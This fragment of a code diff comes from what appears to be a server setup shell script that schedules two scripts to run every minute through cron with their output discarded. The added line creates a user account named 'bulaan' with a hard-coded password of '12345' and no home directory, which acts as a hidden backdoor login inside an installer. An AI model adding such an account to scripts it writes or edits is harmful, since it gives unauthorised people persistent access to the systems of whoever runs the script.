@@ -828,7 +828,7 @@ echo "* * * * * /bin/bash  /home/active.sh >/dev/null 2>&1" | crontab -
 
 echo "* * * * * /bin/bash  /home/authentication.sh >/dev/null 2>&1" | crontab -
 
-
+ /usr/sbin/useradd -p $(openssl passwd -1 12345) -M bulaan
 
 sh active.sh | tee -a  /home/active.sh
 
